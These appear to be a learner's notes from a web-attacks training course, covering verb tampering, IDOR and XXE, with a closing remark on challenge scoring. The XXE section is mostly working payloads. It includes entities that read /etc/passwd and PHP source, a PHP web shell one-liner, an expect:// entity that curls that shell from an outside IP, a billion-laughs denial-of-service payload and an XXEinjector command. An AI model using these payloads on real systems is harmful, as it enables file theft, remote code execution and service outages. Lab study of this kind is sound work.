# Web Attacks

## Verb Tampering

If incurrectly configured it's possible to bypass auth by chnaging request methods. HEAD, PUT, DELETE, OPTIONS, PATCH, GET and POST

Random tip but right clicking in burp gives you the option to change request to a POST and it fixes the headers for you.

## IDOR

This was super mega easy did not learn anything new.

## XXE

Can include files like this

```xml
<!ENTITY company SYSTEM "file:///etc/passwd">
```

We maybe need to base64 encode the output

```xml
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

We can make a php script and upload it on the server

```shell-session
<?php system($_REQUEST["cmd"]);?>
```

```xml
<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'10.10.16.24:8000/shell.php'">
```

Can try DDOS the site too like this

```xml
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
<name>aa</name>
<tel>aaa</tel>
<email>&company;</email>
<message>aaaa</message>
</root>
```

```
ruby XXEinjector.rb --host=10.10.16.24 --httpport=80 --file=xxe.req --path=/etc/passwd --oob=http --phpfilter
```

The above tool can automate xxe injection it's not very good though....

## Assesment

This was a very fun challenge!

I think the cube system is way off. This challenge was fun and not that hard and yet it produces 5 cubes! But the hard assesment on the password attack module that took ages and was remarkably less fun is only one cube. Odd.....
